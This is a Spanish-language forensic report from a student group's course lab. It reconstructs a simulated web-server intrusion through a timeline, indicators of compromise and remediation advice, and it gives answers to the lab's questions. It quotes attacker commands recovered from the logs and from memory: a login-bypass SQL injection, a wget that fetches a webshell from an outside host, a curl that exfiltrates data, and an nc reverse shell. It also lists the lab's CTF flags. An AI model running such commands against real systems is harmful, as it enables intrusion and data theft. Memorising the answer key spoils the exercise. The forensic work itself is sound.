# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 05 · **Investigadores:** Magni, Gastón (@nosungam) · Mosconi, Ignacio
(@ignamosconi) · Presuttari, Matías (@matiaspresuttari) · Terreno, Valentino
(@vterreno) · **Fecha:** 2026-11-07
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

## 0. Declaración de uso de IA

Usamos un asistente de IA (Claude) para ordenar la evidencia, revisar la
correlación entre los artefactos y ayudar a redactar este informe. El análisis
lo hicimos nosotros: verificamos la cadena de custodia con `shasum`, leímos los
logs y los artefactos de disco/memoria, decodificamos el payload de R1 y
completamos `src/timeline.py` para reconstruir la línea de tiempo. Todas las
flags se validaron contra `retos.manifest` con `./ctf submit 11` (ver
`evidencia/ctf-status.txt`). No se copió ninguna solución de referencia y no se
modificó ningún archivo de `labs/lab11-forensia/caso/`: trabajamos siempre sobre
copias de lectura.

## 1. Resumen del incidente

El 5 de septiembre de 2026, entre las 02:14 y las 02:45 UTC, un atacante externo
(185.220.101.42) comprometió `phantomcorp-web`. Entró por el portal de RRHH con
una inyección SQL que le permitió saltarse el login, leyó `/backup/rrhh.conf` y
usó el token de API `phantom-api-7c1e` para ejecutar comandos en
`/api/reporte?cmd=`. Con ese RCE descargó una webshell en
`/var/www/uploads/shell.php`, escaló a root con un binario SUID
(`/usr/local/bin/system-check`), abrió un C2 saliente a `45.13.37.7:4444`,
exfiltró la base de clientes (`/app/priv/clientes.db.txt`) y dejó dos mecanismos
de persistencia: un cron y un usuario UID 0 (`phantom-svc`). Además, alteró
`logs/auth.log` después de la captura, lo que rompió la cadena de custodia de ese
archivo.

## 2. Cadena de custodia

Verificamos cada archivo contra el hash registrado en `caso/evidencia.sha256`:

```
disco/etc/passwd.snippet: OK
disco/listado.txt: OK
disco/var/www/uploads/shell.php.evidencia.txt: OK
logs/access.log: OK
logs/auth.log: FAILED
memoria/bash_history.txt: OK
memoria/lsof.txt: OK
memoria/netstat.txt: OK
memoria/pslist.txt: OK
shasum: WARNING: 1 computed checksum did NOT match
```

Ocho de los nueve archivos verifican correctamente. **`logs/auth.log` falla**:

| | Hash SHA-256 |
|---|---|
| Registrado en la custodia | `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff` |
| Calculado sobre el archivo actual | `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab` |

El archivo alterado contiene, en sus líneas 5-8, un comentario que documenta la
edición posterior a la captura y el marcador recuperado del journal
(`FLAG{dfir_custodia_alterada}`). La salida completa está en
`evidencia/custodia.txt`.

Esto significa que `auth.log` **no es confiable tal como está**: alguien lo tocó
después de la captura. El hallazgo en sí es evidencia (hubo manipulación), pero
las líneas del archivo no pueden usarse como prueba sin documentar la
intervención. El resto de la evidencia conserva su integridad.

## 3. Línea de tiempo del ataque

Todos los horarios son UTC, según `access.log` (el `auth.log` no trae año; se
asume 2026 por correlación con el resto).

| Hora (UTC) | Evento | Evidencia (archivo:línea) |
|---|---|---|
| 02:14:03 | Primer contacto desde 185.220.101.42 con UA `zgrab/0.x` (recon) | `logs/access.log:6` |
| 02:14:19-22 | Enumeración con `gobuster/3.6`: `robots.txt`, `/admin`, `/login`, `/backup`, `/portal-rrhh`, `/uploads` | `logs/access.log:7-12` |
| 02:16:40 y 02:16:58 | Dos intentos de login fallidos (401) contra `/portal-rrhh/login` | `logs/access.log:14-15` |
| 02:17:22 | **SQLi**: login con `user=admin'--` devuelve 200 (bypass de autenticación) | `logs/access.log:16` |
| 02:17:41 | Lee `/backup/rrhh.conf` (configuración expuesta; de ahí sale el token de API) | `logs/access.log:17` |
| 02:18:10 | Prueba de RCE: `cmd=id` sobre `/api/reporte` | `logs/access.log:18` |
| 02:18:33 | **RCE confirmado**: `echo FLAG{dfir_vector_sqli} > /tmp/.p` (payload URL-encodeado) | `logs/access.log:19`; `disco/listado.txt:3` |
| 02:19:02 | Descarga de la webshell: `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php` | `logs/access.log:20`; `memoria/netstat.txt:5` |
| 02:19:48 | Primer uso de la webshell: `/uploads/shell.php?c=whoami` | `logs/access.log:21` |
| 02:19:55 | Login SSH aceptado para `www-data` desde la IP atacante | `logs/auth.log:2` |
| 02:20:31 | Intento de `sudo /bin/bash` denegado para `www-data` | `logs/auth.log:3` |
| 02:21:04 | **Escalada**: ejecución SUID de `/usr/local/bin/system-check` con `euid=0` | `logs/auth.log:4`; `memoria/pslist.txt:8`; `disco/listado.txt:5` |
| 02:22 | **Persistencia**: se crea `/etc/cron.d/phantom-maint` (relanza la webshell cada 5 min) | `disco/listado.txt:6`; `disco/var/www/uploads/shell.php.evidencia.txt:9` |
| 02:23:15 | Lectura de la base de clientes por la webshell: `cat /app/priv/clientes.db.txt` (48.210 bytes) | `logs/access.log:22` |
| 02:23 | Empaquetado para exfiltración: `/tmp/.exfil/clientes.tar.gz` (48.210 bytes) | `memoria/bash_history.txt:8`; `disco/listado.txt:7` |
| 02:23-02:30 | **Exfiltración** por `curl` a `45.13.37.7/upload` y C2 `nc 45.13.37.7 4444` establecido | `memoria/bash_history.txt:9`; `memoria/netstat.txt:4`; `memoria/pslist.txt:9`; `memoria/lsof.txt:3` |
| 02:30 | Captura de memoria (artefactos volátiles extraídos) | `memoria/pslist.txt:1` |
| 02:45:00 | Cierre de la conexión SSH desde la IP atacante | `logs/auth.log:9` |

La secuencia coincide con la sesión interactiva recuperada de memoria:
`id` → `cat /var/www/.env` → `wget` de la webshell → `find / -perm -4000` →
ejecución de `system-check` → `echo FLAG{dfir_privesc_suid}` → `tar` de la base
→ `curl` de exfiltración → `history -c` (`memoria/bash_history.txt:2-10`).

## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | `185.220.101.42` | `logs/access.log:6-22`; `logs/auth.log:2,9` |
| C2 (reverse shell) | `45.13.37.7:4444/tcp` | `memoria/netstat.txt:4`; `memoria/pslist.txt:9`; `memoria/lsof.txt:3` |
| Host de descarga/exfiltración | `45.13.37.7:80/tcp` | `memoria/netstat.txt:5`; `memoria/bash_history.txt:4,9` |
| Archivo malicioso (webshell) | `/var/www/uploads/shell.php` | `disco/var/www/uploads/shell.php.evidencia.txt`; `logs/access.log:20-22` |
| Binario SUID malicioso | `/usr/local/bin/system-check` (copia de bash, SUID root) | `disco/listado.txt:5`; `memoria/pslist.txt:8`; `memoria/lsof.txt:4` |
| Usuario backdoor | `phantom-svc` (UID 0, GID 0) | `disco/etc/passwd.snippet:4` |
| Persistencia | `/etc/cron.d/phantom-maint` | `disco/listado.txt:6`; `disco/var/www/uploads/shell.php.evidencia.txt:9` |
| Credencial/token expuesto | token `phantom-api-7c1e` | `logs/access.log:18-22`; `logs/access.log:17` (`/backup/rrhh.conf`) |
| Datos preparados para exfiltrar | `/tmp/.exfil/clientes.tar.gz` | `disco/listado.txt:7`; `memoria/bash_history.txt:8` |
| Marcador de RCE | `/tmp/.p` | `logs/access.log:19`; `disco/listado.txt:3` |
| Herramientas del atacante | `zgrab/0.x`, `gobuster/3.6`, `curl/8.5` | `logs/access.log:6-22` |

## 5. Alcance del daño

- **Confidencialidad:** el atacante leyó `/var/www/.env` y `/backup/rrhh.conf`,
  y exfiltró la base de clientes `/app/priv/clientes.db.txt` (48.210 bytes) hacia
  `45.13.37.7`. Los datos de clientes deben considerarse comprometidos.
- **Integridad:** plantó una webshell, un binario SUID root, un cron de
  persistencia y un usuario UID 0; además alteró `logs/auth.log` para borrar
  huellas.
- **Disponibilidad:** el servidor quedó bajo control del atacante mediante un
  reverse shell (`nc` PID 1490) hijo del proceso SUID (PID 1477). A las 02:30
  seguía establecido.
- **¿Sigue adentro?** Sí, o al menos conserva mecanismos para volver: el usuario
  `phantom-svc` (UID 0), el cron `/etc/cron.d/phantom-maint` que relanza la
  webshell cada 5 minutos y el binario SUID. No alcanza con matar el `nc`: hay
  que erradicar las tres persistencia y rotar credenciales.

## 6. Contención y erradicación (recomendaciones)

**Contención inmediata (sin destruir evidencia):**

1. Aislar `phantomcorp-web` de la red (segmento/VLAN de cuarentena) y bloquear en
   el perímetro `185.220.101.42` y `45.13.37.7` (todos los puertos).
2. Preservar el estado antes de tocar nada: nueva captura de memoria, snapshot
   del disco y hash de todo (repetir la cadena de custodia y documentar el
   `auth.log` alterado).
3. Matar los procesos del atacante: `1490` (`nc`), `1477` (`system-check`),
   `1240` (`bash`) y `1201` (`sh -c wget`), y cerrar la sesión SSH de
   `www-data`.

**Erradicación:**

4. Eliminar `/var/www/uploads/shell.php`, `/etc/cron.d/phantom-maint`,
   `/tmp/.exfil/`, `/tmp/.p` y el usuario `phantom-svc` del `passwd`/`shadow`.
5. Reemplazar `/usr/local/bin/system-check` por una versión confiable y quitarle
   el bit SUID; auditar todos los binarios SUID del sistema.
6. Rotar **todas** las credenciales que tocó: password de `www-data`, claves de
   base de datos, el token `phantom-api-7c1e`, secretos de `/var/www/.env` y
   `/backup/rrhh.conf`; invalidar sesiones y llaves SSH.
7. Corregir las causas: parametrizar las consultas del login (la SQLi
   `admin'--`), eliminar el command injection de `/api/reporte` (no concatenar
   `cmd`), sacar `/backup` del webroot, impedir ejecución de PHP en `uploads/` y
   aplicar mínimo privilegio a `www-data`.
8. Si la integridad del sistema no se puede garantizar, reconstruir el servidor
   desde una imagen limpia en lugar de "limpiar" el comprometido.

**Post-incidente:** monitorear los IOCs en el resto de la red, revisar accesos
similares desde la misma IP y actualizar reglas de detección (por ejemplo,
requests a `/api/reporte` con `cmd=`, ejecución de binarios SUID desde
`www-data`, conexiones salientes a `4444`).

## 7. Preguntas de análisis (P1–P5)

**P1. ¿Por qué la RAM se captura antes que el disco? Dá un ejemplo de este caso
donde la memoria tenía algo que el disco ya no.**
Porque la RAM es el soporte más volátil: se pierde al apagar o reiniciar la
máquina, mientras que el disco persiste. El orden de volatilidad (RFC 3227) dice
capturar primero lo que antes desaparece. En este caso, el atacante corrió
`history -c` y el `.bash_history` del disco ya no tenía sus comandos; sin
embargo, la captura de memoria conservó el historial de la sesión viva
(`memoria/bash_history.txt`), con el `wget`, el `tar`, el `curl` de exfiltración
y la ejecución del SUID. También la memoria tenía el proceso `nc` y la conexión
`ESTABLISHED` al C2 (`pslist.txt:9`, `netstat.txt:4`), que no existen como
archivo en el disco.

**P2. El R5: ¿cómo supiste que el archivo fue alterado? ¿Por qué eso invalida la
evidencia si no se documenta?**
Porque el hash SHA-256 calculado sobre `logs/auth.log` no coincide con el hash
registrado en `caso/evidencia.sha256` al momento de la captura. La función hash
es determinista: si un solo byte cambia, el digest cambia por completo. Ocho
archivos dieron `OK` y `auth.log` dio `FAILED`. Eso invalida el archivo como
prueba porque no se puede demostrar que su contenido sea el que había en la
escena: pudo agregarse, quitarse o modificarse cualquier línea. Si la alteración
no se documenta, el tribunal (o el propio equipo) no puede distinguir entre
evidencia original y evidencia manipulada, y toda la cadena de custodia queda
cuestionada. Acá la alteración se detectó y se documentó; por eso el hallazgo es
válido como evidencia *de la manipulación*, pero las líneas alteradas no se usan
como prueba de los hechos.

**P3. Correlacioná tres artefactos (log + disco + memoria) que apunten al MISMO
evento con el mismo timestamp.**
Evento: descarga y creación de la webshell a las **02:19**.
- Log: `logs/access.log:20` registra a las 02:19:02 el `wget` de
  `http://45.13.37.7/s.php` hacia `/var/www/uploads/shell.php`.
- Disco: `disco/listado.txt:4` muestra `/var/www/uploads/shell.php` creado a las
  02:19, con 431 bytes.
- Memoria: `memoria/netstat.txt:5` muestra la conexión del proceso `wget` (PID
  1201) a `45.13.37.7:80` en `TIME_WAIT`, y `memoria/pslist.txt:6` muestra el
  proceso `sh -c wget http://45.13.37.7/s.php`.

Segundo evento correlacionado, a las **02:21**: `auth.log:4` (SUID exec),
`disco/listado.txt:5` (binario SUID creado a las 02:21) y `memoria/pslist.txt:8`
(proceso `system-check` con `euid=0`).

**P4. El atacante corrió `history -c`. ¿Por qué igual pudiste recuperar sus
comandos?**
Porque `history -c` limpia la lista de historial de la sesión actual en memoria,
pero no borra de forma segura todo lo que ya se había escrito ni la memoria del
proceso `bash` que seguía vivo. La captura de RAM se hizo a las 02:30, con la
sesión del atacante todavía abierta (proceso `bash` PID 1240, hijo del `sh -c
wget`), así que el buffer de historial y el entorno del proceso estaban en la
captura. Además, el atacante no reescribió necesariamente el `.bash_history` del
disco: si el shell no se cerró limpiamente o si el archivo no se sincronizó, los
comandos previos podían seguir ahí. La lección: `history -c` no es un borrado
forense; la memoria y los artefactos derivados (procesos, conexiones, archivos
abiertos) delatan la sesión.

**P5. Cierre del curso: recorriste ataque, agentes, defensa y forensia. ¿Por qué
un buen forense tiene que entender cómo ataca un pentester?**
Porque la evidencia no dice "aquí hubo SQLi": dice que a las 02:17:22 un POST
devolvió 200 con `user=admin'--`, que a las 02:18:33 apareció un `cmd=echo` y que
a las 02:19 se creó un archivo en `uploads/`. Para convertir esos bytes en una
historia hay que saber qué hace un atacante, en qué orden y con qué herramientas.
Ese conocimiento guía las hipótesis (dónde mirar, qué es normal y qué no),
permite distinguir un artefacto legítimo de uno malicioso, anticipar la
persistencia (cron, usuario UID 0, SUID) y reconstruir la intención. Sin modelo
del ataque, el forense ve ruido; con modelo, ve la cadena. Y al revés: entender
la forense hace mejores atacantes/pentesters, porque saben qué rastro dejan.

## 8. Anexo — bitácora de comandos

```bash
# 1. Cadena de custodia (siempre sobre la evidencia original, solo lectura)
cd labs/lab11-forensia/caso
shasum -a 256 -c evidencia.sha256

# 2. Timeline: filtrar la IP atacante y clasificar por fase
cd ../../../entregas/lab11/grupo05
python3 src/timeline.py ../../../labs/lab11-forensia/caso/logs/access.log \
  --ip 185.220.101.42

# 3. Logs: peticiones clave y payload de R1
grep -n "api/reporte\|shell.php\|portal-rrhh" \
  ../../../labs/lab11-forensia/caso/logs/access.log
python3 -c "import urllib.parse; print(urllib.parse.unquote(
  'echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p'))"

# 4. Disco y memoria
grep -n "" ../../../labs/lab11-forensia/caso/disco/listado.txt
grep -n "" ../../../labs/lab11-forensia/caso/disco/etc/passwd.snippet
grep -n "" ../../../labs/lab11-forensia/caso/memoria/bash_history.txt
grep -n "" ../../../labs/lab11-forensia/caso/memoria/pslist.txt
grep -n "" ../../../labs/lab11-forensia/caso/memoria/netstat.txt
grep -n "" ../../../labs/lab11-forensia/caso/memoria/lsof.txt

# 5. Validación de los 5 hallazgos
cd ../../..
./ctf submit 11 R1 'FLAG{dfir_vector_sqli}'
./ctf submit 11 R2 'FLAG{dfir_webshell_hallado}'
./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'
./ctf submit 11 R4 'FLAG{dfir_c2_exfil}'
./ctf submit 11 R5 'FLAG{dfir_custodia_alterada}'
./ctf status 11
```
